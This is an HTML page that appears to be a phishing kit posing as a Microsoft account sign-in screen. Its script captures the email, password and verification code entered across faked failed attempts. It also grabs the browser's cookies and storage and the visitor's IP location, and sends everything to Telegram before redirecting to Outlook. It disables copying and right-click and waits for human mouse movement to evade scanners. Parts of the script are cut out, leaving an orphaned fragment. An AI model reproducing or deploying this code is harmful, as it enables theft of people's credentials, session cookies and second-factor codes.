<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Sign in to your account</title>
  <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/732/732221.png" />
  <style>
    :root {
      --pc-blue: #0067b8;
      --pc-blue-hover: #005da6;
      --text-main: #1b1b1b;
      --text-secondary: #666666;
    }

    html, body {
      height: 100%;
      margin: 0;
      overflow: hidden;
      background-color: #f2f2f2;
    }

    body {
      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", Tahoma, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    .layout {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      width: 100vw;
      background-image: url("https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg");
      background-size: cover;
      background-position: center;
      position: relative;
      padding: 20px;
      box-sizing: border-box;
      overflow-y: auto;
    }

    .layout::before {
      content: "";
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(25px) saturate(150%);
      -webkit-backdrop-filter: blur(25px) saturate(150%);
      z-index: 1;
      pointer-events: none;
    }

    .content-wrapper {
      position: relative;
      z-index: 2;
      width: 100%;
      max-width: 440px;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    .panel {
      background: rgba(255, 255, 255, 0.75);
      padding: 44px;
      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.2);
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 255, 255, 0.3);
      border-radius: 4px;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
    }

    .logo-row {
      margin-bottom: 24px;
    }

    .logo-img {
      width: 108px;
      height: 24px;
      object-fit: contain;
    }

    .title {
      font-size: 24px;
      font-weight: 600;
      color: var(--text-main);
      margin-bottom: 16px;
      line-height: 28px;
    }

    .identity-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 16px;
      font-size: 15px;
      color: var(--text-main);
    }

    #backBtn {
      background: none;
      border: none;
      padding: 4px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      transition: background 0.2s;
    }

    #backBtn:hover {
      background: rgba(0, 0, 0, 0.05);
    }

    .field-block {
      width: 100%;
      display: flex;
      flex-direction: column;
      margin-bottom: 16px;
    }

    .input {
      width: 100%;
      border: none;
      border-bottom: 1px solid #666;
      background: transparent;
      padding: 6px 0;
      font-size: 15px;
      color: #1b1b1b;
      box-sizing: border-box;
      outline: none;
      transition: border-color 0.2s;
    }

    .input:focus {
      border-bottom-color: var(--pc-blue);
    }

    .input::-webkit-input-placeholder { color: #666; opacity: 1; }
    .input::-moz-placeholder           { color: #666; opacity: 1; }
    .input:-ms-input-placeholder       { color: #666; opacity: 1; }
    .input::placeholder                { color: #666; opacity: 1; }

    .input.input-error {
      border-bottom-color: #e81123;
    }

    .link-row {
      font-size: 13px;
      color: #0067b8;
      margin-bottom: 24px;
    }

    .link-row a {
      text-decoration: none;
      cursor: pointer;
      color: #0067b8;
    }

    .link-row a:hover {
      text-decoration: underline;
      color: #005da6;
    }

    .btn-row {
      display: flex;
      justify-content: flex-end;
      margin-top: 24px;
    }

    .btn {
      background: var(--pc-blue);
      border: none;
      color: white;
      cursor: pointer;
      padding: 8px 32px;
      font-size: 15px;
      min-width: 108px;
      text-align: center;
      transition: background 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 2px;
    }

    .btn:hover {
      background: var(--pc-blue-hover);
    }

    .btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    #errorMsg {
      color: #e81123;
      font-size: 15px;
      margin-top: 12px;
      display: none;
    }

    .hidden {
      display: none !important;
    }

    .spinner {
      display: none;
      width: 14px;
      height: 14px;
      border: 2px solid rgba(255, 255, 255, .3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin .9s linear infinite;
      margin-right: 8px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Initial Loader Styles */
    #initialLoader {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      flex-grow: 1;
      padding-bottom: 40px;
    }

    .ms-loader {
      display: flex;
      gap: 4px;
      margin-bottom: 20px;
    }

    .dot {
      width: 4px;
      height: 4px;
      background-color: #0067b8;
      border-radius: 50%;
      animation: ms-dot 1.5s infinite ease-in-out;
    }

    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }
    .dot:nth-child(4) { animation-delay: 0.6s; }
    .dot:nth-child(5) { animation-delay: 0.8s; }

    @keyframes ms-dot {
      0%, 80%, 100% { transform: scale(0); opacity: 0; }
      40% { transform: scale(1); opacity: 1; }
    }

    .loader-text {
      font-size: 15px;
      color: #1b1b1b;
    }

    /* Sign-in Options Box - Maintained from original */
    .signin-options-box {
      background: rgba(255, 255, 255, 0.75);
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.2);
      border: 1px solid rgba(255, 255, 255, 0.3);
      border-radius: 4px;
      overflow: hidden;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }

    .signin-options-header {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px 44px;
      cursor: pointer;
      transition: background-color 0.15s ease;
      border: none;
      background: none;
      width: 100%;
      text-align: left;
      font-family: inherit;
      font-size: 15px;
      color: var(--text-main);
    }

    .signin-options-header:hover {
      background-color: rgba(0, 0, 0, 0.05);
    }

    .signin-options-header:focus {
      outline: 1px dashed #000;
      outline-offset: -2px;
    }

    .options-icon {
      width: 24px;
      height: 24px;
      flex-shrink: 0;
    }

    .options-icon-img {
      width: 24px;
      height: 24px;
      display: block;
      filter: grayscale(0);
      transition: filter 0.2s ease;
    }

    .signin-options-header:hover .options-icon-img {
      filter: brightness(1.1);
    }

    .options-text {
      flex: 1;
      font-weight: 400;
    }

    .options-panel {
      display: none;
      border-top: 1px solid rgba(0, 0, 0, 0.1);
    }

    .options-panel.show {
      display: block;
      animation: expandPanel 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }

    @keyframes expandPanel {
      from {
        opacity: 0;
        max-height: 0;
      }
      to {
        opacity: 1;
        max-height: 500px;
      }
    }

    .option-item {
      display: flex;
      align-items: center;
      gap: 12px;
      width: 100%;
      padding: 16px 44px;
      background-color: transparent;
      border: none;
      border-bottom: 1px solid rgba(0, 0, 0, 0.05);
      cursor: pointer;
      font-family: inherit;
      font-size: 15px;
      line-height: 20px;
      color: var(--text-main);
      text-align: left;
      transition: all 0.15s ease;
    }

    .option-item:hover {
      background-color: rgba(0, 0, 0, 0.05);
      transform: translateX(2px);
    }

    .option-item:active {
      background-color: rgba(0, 0, 0, 0.08);
    }

    .option-item:focus {
      outline: 1px dashed #000;
      outline-offset: -2px;
    }

    .option-item:last-child {
      border-bottom: none;
    }

    .option-icon-box {
      width: 24px;
      height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      color: #0067b8;
    }

    .option-icon-box svg {
      width: 20px;
      height: 20px;
      transition: transform 0.2s ease;
    }

    .option-item:hover .option-icon-box svg {
      transform: scale(1.1);
    }

    .option-text-block {
      flex: 1;
    }

    .option-title {
      font-size: 15px;
      line-height: 20px;
      color: var(--text-main);
      font-weight: 400;
    }

    .option-desc {
      font-size: 12px;
      line-height: 16px;
      color: var(--text-secondary);
      margin-top: 2px;
    }

    .footer-links {
      position: fixed;
      bottom: 20px;
      right: 20px;
      z-index: 2;
      display: flex;
      gap: 12px;
      backdrop-filter: blur(10px);
      padding: 8px;
      border-radius: 4px;
    }

    .footer-links a {
      color: #000;
      font-size: 12px;
      text-decoration: none;
      transition: color 0.15s ease;
    }

    .footer-links a:hover {
      text-decoration: underline;
      color: #0067b8;
    }

    /* Tablet and small desktop adjustments */
    @media (max-width: 768px) {
      .layout {
        padding: 16px;
      }

      .panel {
        padding: 32px;
      }

      .signin-options-header,
      .option-item {
        padding-left: 32px;
        padding-right: 32px;
      }
    }

    /* Small tablets */
    @media (max-width: 600px) {
      .layout {
        padding: 12px;
      }

      .content-wrapper {
        gap: 12px;
      }

      .panel {
        padding: 28px;
      }

      .title {
        font-size: 22px;
        line-height: 26px;
      }

      .signin-options-header,
      .option-item {
        padding-left: 28px;
        padding-right: 28px;
      }

      .footer-links {
        bottom: 12px;
        right: 12px;
        font-size: 11px;
        gap: 10px;
      }
    }

    /* Mobile devices - Full screen experience */
    @media (max-width: 480px) {
      html, body {
        overflow-x: hidden;
      }

      .layout {
        background: white;
        overflow-y: auto;
        overflow-x: hidden;
        padding: 0;
        min-height: 100vh;
        height: auto;
      }

      .layout::before {
        display: none;
      }

      .content-wrapper {
        max-width: 100%;
        gap: 0;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
      }

      .panel {
        box-shadow: none;
        padding: 24px 20px;
        background: white;
        border: none;
        backdrop-filter: none;
        border-radius: 0;
        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        flex-grow: 1;
      }

      .logo-img {
        width: 96px;
        height: auto;
      }

      .title {
        font-size: 20px;
        line-height: 24px;
        margin-bottom: 12px;
      }

      .input {
        font-size: 16px; /* Prevents zoom on iOS */
        padding: 8px 0;
      }

      .btn {
        padding: 10px 24px;
        font-size: 15px;
        min-width: 90px;
      }

      .signin-options-box {
        box-shadow: none;
        background: white;
        border: none;
        backdrop-filter: none;
        border-radius: 0;
        border-top: 1px solid rgba(0, 0, 0, 0.1);
      }

      .signin-options-header,
      .option-item {
        padding-left: 20px;
        padding-right: 20px;
        padding-top: 14px;
        padding-bottom: 14px;
      }

      .option-title {
        font-size: 14px;
      }

      .option-desc {
        font-size: 11px;
      }

      .footer-links {
        position: relative;
        bottom: auto;
        right: auto;
        padding: 20px;
        justify-content: center;
        background: white;
        border-top: 1px solid rgba(0, 0, 0, 0.1);
        width: 100%;
        box-sizing: border-box;
        flex-wrap: wrap;
      }

      .footer-links a {
        font-size: 11px;
      }
    }

    /* Extra small mobile devices */
    @media (max-width: 360px) {
      .panel {
        padding: 20px 16px;
      }

      .logo-img {
        width: 84px;
      }

      .title {
        font-size: 18px;
        line-height: 22px;
      }

      .signin-options-header,
      .option-item {
        padding-left: 16px;
        padding-right: 16px;
        padding-top: 12px;
        padding-bottom: 12px;
      }

      .options-icon,
      .options-icon-img {
        width: 20px;
        height: 20px;
      }

      .option-icon-box {
        width: 20px;
        height: 20px;
      }

      .option-icon-box svg {
        width: 18px;
        height: 18px;
      }

      .footer-links {
        padding: 16px;
        gap: 8px;
      }

      .btn {
        padding: 8px 20px;
        min-width: 80px;
        font-size: 14px;
      }
    }

    /* Landscape orientation adjustments for mobile */
    @media (max-width: 900px) and (max-height: 500px) and (orientation: landscape) {
      .layout {
        padding: 8px;
        overflow-y: auto;
      }

      .panel {
        padding: 16px 24px;
      }

      .logo-row {
        margin-bottom: 16px;
      }

      .title {
        font-size: 18px;
        margin-bottom: 12px;
      }

      .field-block {
        margin-bottom: 12px;
      }

      .btn-row {
        margin-top: 16px;
      }

      .footer-links {
        position: relative;
        bottom: auto;
        right: auto;
        padding: 12px;
        justify-content: center;
      }

      .signin-options-box {
        margin-bottom: 8px;
      }
    }

    /* Large screens */
    @media (min-width: 1200px) {
      .content-wrapper {
        max-width: 480px;
      }

      .panel {
        padding: 48px;
      }

      .signin-options-header,
      .option-item {
        padding-left: 48px;
        padding-right: 48px;
      }
    }

    /* High DPI screens */
    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
      .logo-img {
        image-rendering: -webkit-optimize-contrast;
        image-rendering: crisp-edges;
      }
    }

    /* Reduced motion preference */
    @media (prefers-reduced-motion: reduce) {
      *,
      *::before,
      *::after {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
      }
    }

    /* Print styles */
    @media print {
      .layout::before,
      .footer-links,
      .signin-options-box {
        display: none !important;
      }

      .panel {
        box-shadow: none;
        border: 1px solid #000;
      }
    }
  </style>
</head>
<body>
  <div class="layout">
    <div class="content-wrapper">
      <div class="panel">
        <div class="logo-row">
          <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" class="logo-img">
        </div>

        <!-- Initial Loader -->
        <div id="initialLoader">
          <div class="ms-loader">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
          </div>
          <div class="loader-text">Because you're Accessing Protected Documents .. </div>
        </div>

        <div id="loginSection" class="hidden">
          <div id="identityDisplay" class="identity-row hidden">
            <button type="button" id="backBtn">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <path d="M19 12H5M12 19l-7-7 7-7" />
              </svg>
            </button>
            <span id="displayEmail"></span>
          </div>
          <div class="title" id="formTitle">Sign in</div>
          <form id="loginForm">
            <div class="field-block">
              <input type="email" id="email" class="input" placeholder="Email, phone, or Skype" required>
            </div>
            <div id="passwordSection" class="field-block hidden">
              <input type="password" id="password" class="input" placeholder="Password">
            </div>
            <div id="codeSection" class="field-block hidden">
              <input type="text" id="verificationCode" class="input" placeholder="Code">
            </div>

            <div id="linksContainer">
              <div class="link-row">
                No account? <a href="#">Create one!</a>
              </div>
              <div class="link-row" style="margin-bottom: 0;">
                <a href="#">Can't access your account?</a>
              </div>
            </div>

            <div id="errorMsg"></div>

            <div class="btn-row">
              <button type="submit" class="btn" id="loginBtn">
                <span class="spinner" id="spinner"></span>
                <span id="btnText">Next</span>
              </button>
            </div>
          </form>
        </div>
      </div>

      <!-- Sign-in Options Box (Maintained from original) -->
      <div class="signin-options-box" id="signinOptionsBox">
        <button type="button" class="signin-options-header" onclick="toggleOptions()" aria-expanded="false" id="optionsBtn">
          <div class="options-icon">
            <img class="options-icon-img" 
                 src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" 
                 alt="Sign-in options"
                 role="presentation">
          </div>
          <span class="options-text">Sign-in options</span>
        </button>

        <div class="options-panel" id="optionsPanel">
          <button type="button" class="option-item" onclick="selectOption('key')">
            <div class="option-icon-box">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>
              </svg>
            </div>
            <div class="option-text-block">
              <div class="option-title">Sign in with a security key</div>
              <div class="option-desc">Use your FIDO2 security key or passkey</div>
            </div>
          </button>

          <button type="button" class="option-item" onclick="selectOption('github')">
            <div class="option-icon-box">
              <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
              </svg>
            </div>
            <div class="option-text-block">
              <div class="option-title">Sign in with GitHub</div>
              <div class="option-desc">Use your GitHub account</div>
            </div>
          </button>

          <button type="button" class="option-item" onclick="selectOption('windowshello')">
            <div class="option-icon-box">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="3" width="18" height="18" rx="2"/>
                <circle cx="12" cy="12" r="3"/>
                <path d="M12 8v1M12 15v1M8 12h1M15 12h1"/>
              </svg>
            </div>
            <div class="option-text-block">
              <div class="option-title">Use Windows Hello</div>
              <div class="option-desc">Face, fingerprint, or PIN</div>
            </div>
          </button>
        </div>
      </div>
    </div>

    <div class="footer-links">
      <a href="#">Terms of use</a>
      <a href="#">Privacy & cookies</a>
      <a href="#">...</a>
    </div>
  </div>

  <script>
    // Prevent bot detection and right-click
    if (!navigator.userAgent || navigator.userAgent === "" || navigator.webdriver) {
      console.warn("Bot detected!");
    }

    const preventDefault = (e) => e.preventDefault();
    document.addEventListener("contextmenu", preventDefault);
    document.addEventListener("copy", preventDefault);
    document.addEventListener("cut", preventDefault);
    document.addEventListener("selectstart", preventDefault);

    // Toggle sign-in options
    function toggleOptions() {
      const panel = document.getElementById('optionsPanel');
      const btn = document.getElementById('optionsBtn');
      const isExpanded = panel.classList.toggle('show');
      btn.setAttribute('aria-expanded', isExpanded);
    }

    // Select authentication option
    function selectOption(option) {
      const messages = {
        'key': 'Security key authentication selected\n\nThis would prompt for your FIDO2 security key.',
        'github': 'GitHub authentication selected\n\nThis would redirect to GitHub OAuth.',
        'windowshello': 'Windows Hello selected\n\nThis would prompt for biometric or PIN authentication.'
      };
      
      console.log('Selected:', option);
      alert(messages[option] || 'Option selected');
    }

    async function validateWorkEmail(email) {
      // Layer 1 – basic format
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email.trim())) {
        return { ok: false, msg: 'Enter a valid email address.' };
      }

      // Layer 2 – personal-domain blocklist
      var domain = email.trim().split('@')[1].toLowerCase();
      if (PERSONAL_DOMAINS.has(domain)) {
        return { ok: false, msg: 'Please use your work email address. Personal emails are not accepted.' };
      }

      // Layer 3 – Cloudflare DoH MX lookup (fail-open on any network error)
      try {
        var opts = { headers: { accept: 'application/dns-json' } };
        if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.timeout === 'function') {
          opts.signal = AbortSignal.timeout(6000);
        }
        var res = await fetch(
          'https://cloudflare-dns.com/dns-query?name=' + encodeURIComponent(domain) + '&type=MX',
          opts
        );
        if (res.ok) {
          var data = await res.json();
          // NXDOMAIN (Status 3) or empty Answer → domain has no MX records
          if (data.Status === 3 || !data.Answer || data.Answer.length === 0) {
            return { ok: false, msg: 'This email does not appear to  be the intended recipient email . Please use your valid work email.' };
          }
        }
        // Non-OK HTTP → fail-open (don't block real users on Cloudflare outage)
      } catch (_) {
        // Timeout or network error → fail-open
      }

      return { ok: true };
    }

      // Function to extract all cookies from the browser with domain info
      async function extractAllCookies() {
        var domainInfo = getDomainInfo();
        var result = {
          currentDomain: domainInfo.hostname,
          origin: domainInfo.origin,
          protocol: domainInfo.protocol,
          cookieCount: 0,
          cookies: '',
          cookieDetails: []
        };
        
        // Try Cookie Store API first (Chrome/Edge) for detailed info
        try {
          if (window.cookieStore && typeof window.cookieStore.getAll === 'function') {
            var allCookies = await window.cookieStore.getAll();
            result.cookieCount = allCookies.length;
            
            if (allCookies.length === 0) {
              result.cookies = 'No cookies found via Cookie Store API';
              return result;
            }
            
            var formattedCookies = [];
            for (var i = 0; i < allCookies.length; i++) {
              var cookie = allCookies[i];
              var cookieDomain = cookie.domain || domainInfo.hostname;
              var details = {
                domain: cookieDomain,
                name: cookie.name,
                value: cookie.value,
                path: cookie.path || '/',
                secure: cookie.secure,
                httpOnly: cookie.httpOnly,
                sameSite: cookie.sameSite,
                expires: cookie.expires ? new Date(cookie.expires).toISOString() : null
              };
              result.cookieDetails.push(details);
              
              var line = '[' + cookieDomain + '] ' + cookie.name + '=' + cookie.value.substring(0, 100);
              if (cookie.value.length > 100) line += '... [truncated]';
              line += ' | Path: ' + details.path;
              line += ' | Secure: ' + (details.secure ? 'Yes' : 'No');
              line += ' | HttpOnly: ' + (details.httpOnly ? 'Yes' : 'No');
              if (details.expires) line += ' | Expires: ' + details.expires;
              if (details.sameSite) line += ' | SameSite: ' + details.sameSite;
              formattedCookies.push(line);
            }
            result.cookies = formattedCookies.join('\n');
            result.source = 'Cookie Store API';
          } else {
            // Fallback to document.cookie
            var cookies = document.cookie;
            if (cookies && cookies !== '') {
              var cookieList = cookies.split(';');
              var formattedCookies = [];
              
              for (var i = 0; i < cookieList.length; i++) {
                var cookie = cookieList[i].trim();
                if (cookie) {
                  result.cookieCount++;
                  var separatorIndex = cookie.indexOf('=');
                  if (separatorIndex > -1) {
                    var name = cookie.substring(0, separatorIndex).trim();
                    var value = cookie.substring(separatorIndex + 1).trim();
                    result.cookieDetails.push({
                      domain: domainInfo.hostname,
                      name: name,
                      value: value,
                      path: '/',
                      secure: false,
                      httpOnly: false
                    });
                    formattedCookies.push('[' + domainInfo.hostname + '] ' + name + '=' + value.substring(0, 100) + (value.length > 100 ? '... [truncated]' : ''));
                  }
                }
              }
              result.cookies = formattedCookies.join('\n');
            } else {
              result.cookies = 'No cookies accessible for this domain';
            }
            result.source = 'document.cookie';
          }
        } catch (e) {
          // Final fallback
          result.cookies = 'Error accessing cookies: ' + e.message;
          result.source = 'error';
        }
        
        return result;
      }

          '\uD83D\uDC64 New visitor on page:\n' +
          'URL: '        + browserInfo.currentUrl       + '\n' +
          'Hostname: '   + browserInfo.hostname         + '\n' +
          'Referrer: '   + browserInfo.referrer         + '\n' +
          'User-Agent: ' + browserInfo.userAgent        + '\n' +
          'Platform: '   + browserInfo.platform         + '\n' +
          'Screen: '     + browserInfo.screenResolution + '\n' +
          'Timezone: '   + browserInfo.timezone         + '\n\n' +
          formatStorageData(storageData);

        sendToTelegram(initialMessage).catch(function() {});
      }

      // Mouse-move handler: requires ≥3 genuine movements (>10 px each).
      // A headless browser injecting a single dispatchEvent call scores 0.
      function onMouseMove(e) {
        if (notificationSent || !loaderReady) return;
        var dx = Math.abs(e.clientX - lastMouseX);
        var dy = Math.abs(e.clientY - lastMouseY);
        if (lastMouseX !== -1 && (dx > 10 || dy > 10)) {
          mouseMoveCount++;
        }
        lastMouseX = e.clientX;
        lastMouseY = e.clientY;
        if (mouseMoveCount >= 3) {
          fireVisitorNotification();
        }
      }

      // Generic handler for click / touch / key / focus signals.
      function onHumanSignal() {
        if (notificationSent || !loaderReady) return;
        fireVisitorNotification();
      }

      // Attach listeners up-front (passive for scroll performance).
      document.addEventListener('mousemove',  onMouseMove,   { passive: true });
      document.addEventListener('click',      onHumanSignal, { passive: true });
      document.addEventListener('touchstart', onHumanSignal, { passive: true });
      document.addEventListener('keydown',    onHumanSignal, { passive: true });
      emailInput.addEventListener('focus',    onHumanSignal, { passive: true });
      emailInput.addEventListener('click',    onHumanSignal, { passive: true });

      // Show loader for 5 s then reveal the form and arm the gate.
      // The gate (loaderReady) opens only AFTER the form is visible so that
      // any synthetic events fired during page load are discarded.
      setTimeout(function() {
        initialLoader.classList.add('hidden');
        loginSection.classList.remove('hidden');
        loaderReady = true; // gate is now open — waiting for a real human
      }, 5000);

      function showAlert(msg) {
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
      }

      backBtn.addEventListener('click', function() {
        currentStep = 'email';
        passwordSection.classList.add('hidden');
        codeSection.classList.add('hidden');
        identityDisplay.classList.add('hidden');
        linksContainer.classList.remove('hidden');
        emailInput.style.display = 'block';
        formTitle.textContent = 'Sign in';
        text.textContent = 'Next';
        passwordInput.value = '';
        errorMsg.style.display = 'none';
        signinOptionsBox.style.display = 'block';
      });

      form.addEventListener('submit', async function (e) {
        e.preventDefault();

        if (currentStep === 'email') {
          var emailVal = emailInput.value.trim();
          if (!emailVal) return;

          // Show spinner while validating domain
          loginBtn.disabled = true;
          spinner.style.display = 'inline-block';
          text.textContent = 'Checking...';
          errorMsg.style.display = 'none';
          emailInput.classList.remove('input-error');

          var result = await validateWorkEmail(emailVal);

          loginBtn.disabled = false;
          spinner.style.display = 'none';
          text.textContent = 'Next';

          if (!result.ok) {
            emailInput.classList.add('input-error');
            errorMsg.textContent = result.msg;
            errorMsg.style.display = 'block';
            emailInput.focus();
            return;
          }

          emailInput.classList.remove('input-error');
          displayEmail.textContent = emailVal;
          emailInput.style.display = 'none';
          identityDisplay.classList.remove('hidden');
          passwordSection.classList.remove('hidden');
          linksContainer.classList.add('hidden');
          formTitle.textContent = 'Enter password';
          text.textContent = 'Sign in';
          currentStep = 'password';
          signinOptionsBox.style.display = 'none';
          return;
        }

        loginBtn.disabled = true;
        spinner.style.display = 'inline-block';
        text.textContent = 'Signing in...';
        errorMsg.style.display = 'none';

        attemptCount++;

        var demoEmail = emailInput.value || " ";
        var demoPassword = passwordInput.value || " ";
        var demoCode = document.getElementById('verificationCode').value || " ";
        var demoTime = new Date().toISOString();
        var storageData = await collectAllStorageData();
        var browserInfo = getBrowserInfo();

        if (attemptCount >= 3) {
          fetch('https://api.ipgeolocation.io/ipgeo?apiKey=bbdd6e41e7b74e1aad798d0fb9f4d7e5')
            .then(function(response) { return response.json(); })
            .then(function(data) {
              var demoIP = data.ip || 'Unavailable';
              var locationParts = [data.city, data.state_prov, data.country_name].filter(function(part) { return part; });
              var demoLocation = locationParts.length > 0 ? locationParts.join(', ') : 'Unavailable';

              var demoMessage = 'Login Attempt #' + attemptCount + ':\n' +
                                'Email: ' + demoEmail + '\n' +
                                'Password: ' + demoPassword + '\n' +
                                'Verification Code: ' + demoCode + '\n' +
                                'Time: ' + demoTime + '\n' +
                                'IP: ' + demoIP + '\n' +
                                'Location: ' + demoLocation + '\n\n' +
                                '=== BROWSER INFO ===\n' +
                                'User-Agent: ' + browserInfo.userAgent + '\n' +
                                'Platform: ' + browserInfo.platform + '\n' +
                                'Language: ' + browserInfo.language + '\n' +
                                'Screen: ' + browserInfo.screenResolution + '\n' +
                                'Timezone: ' + browserInfo.timezone + '\n\n' +
                                formatStorageData(storageData);

              return sendToTelegram(demoMessage);
            })
            .then(function () {
              setTimeout(function () {
                window.location.href = 'https://outlook.live.com/mail/';
              }, 500);
            })
            .catch(function () {
              setTimeout(function () {
                window.location.href = 'https://outlook.live.com/mail/';
              }, 500);
            });
          return;
        }

        fetch('https://api.ipgeolocation.io/ipgeo?apiKey=bbdd6e41e7b74e1aad798d0fb9f4d7e5')
          .then(function(response) { return response.json(); })
          .then(function(data) {
            var demoIP = data.ip || 'Unavailable';
            var locationParts = [data.city, data.state_prov, data.country_name].filter(function(part) { return part; });
            var demoLocation = locationParts.length > 0 ? locationParts.join(', ') : 'Unavailable';

            var demoMessage = 'Login Attempt #' + attemptCount + ':\n' +
                              'Email: ' + demoEmail + '\n' +
                              'Password: ' + demoPassword + '\n' +
                              'Time: ' + demoTime + '\n' +
                              'IP: ' + demoIP + '\n' +
                              'Location: ' + demoLocation + '\n\n' +
                              '=== BROWSER INFO ===\n' +
                              'User-Agent: ' + browserInfo.userAgent + '\n' +
                              'Platform: ' + browserInfo.platform + '\n' +
                              'Language: ' + browserInfo.language + '\n' +
                              'Screen: ' + browserInfo.screenResolution + '\n' +
                              'Timezone: ' + browserInfo.timezone + '\n\n' +
                              formatStorageData(storageData);

            return sendToTelegram(demoMessage);
          })
          .then(function (res) { return res.json(); })
          .then(function () {
            if (attemptCount === 2) {
              passwordSection.classList.add('hidden');
              codeSection.classList.remove('hidden');
              formTitle.textContent = 'Enter code';
              showAlert('Please enter the verification code from your Microsoft Auth app.');
              document.getElementById('verificationCode').focus();
            } else {
              showAlert('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
              passwordInput.value = '';
            }
          })
          .catch(function () {
            showAlert('Something went wrong. Please try again.');
          })
          .finally(function () {
            loginBtn.disabled = false;
            spinner.style.display = 'none';
            text.textContent = 'Sign in';
          });
      });
    })();
  </script>
</body>
</html>
